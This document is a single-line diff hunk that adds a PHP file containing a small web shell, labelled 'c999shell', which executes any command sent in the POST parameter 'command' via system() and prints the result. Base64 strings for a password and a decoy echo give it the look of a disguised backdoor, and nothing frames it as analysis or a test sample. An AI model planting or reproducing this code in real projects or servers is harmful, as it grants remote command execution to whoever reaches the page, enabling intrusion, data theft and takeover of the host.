@@ -1,0 +1,1 @@
+<?php $auth_pass="c2VjcmV0"; $c999shell="1.07"; $dir=getcwd(); if(isset($_POST["command"])){echo "<pre>"; system($_POST["command"]); echo "</pre>";} echo base64_decode("Zm9vYmFy"); ?>
